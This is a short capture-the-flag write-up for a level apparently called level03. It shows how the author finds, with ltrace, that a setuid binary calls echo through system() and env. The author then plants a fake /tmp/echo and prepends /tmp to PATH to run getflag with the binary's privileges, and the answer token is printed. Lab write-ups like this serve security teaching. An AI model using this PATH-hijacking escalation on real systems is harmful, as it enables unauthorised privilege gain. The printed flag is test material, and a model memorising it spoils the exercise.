## Exploring the exercice

```bash 
$ ls -la
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
```

```bash 
$ file level03
executable with setuid and setgid active
```
```bash 
$ ./level03
Exploit me
```

## Learning more about the executable 

```bash
$ ltrace ./level03 
[...]
system("/usr/bin/env echo Exploit me"Exploit me)
[...]
```

We see that the executable calls the echo function with system.
I did a previous CTF where we had to change the PATH to have a custom echo command, we will do the same here.

## Implementing our own echo command

```bash
$ echo "/bin/sh -c 'getflag'" > /tmp/echo
$ chmod 755 /tmp/echo
```

On ajoute notre dossier tmp au PATH afin que notre echo soit execute au lieu de celui par defaut 

```bash
$ export PATH=/tmp:$PATH
```

I make sure that tmp has been added to the path :
```bash
$ which echo 
/tmp/echo
```

And finally 
```bash
$ ./level03 
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```
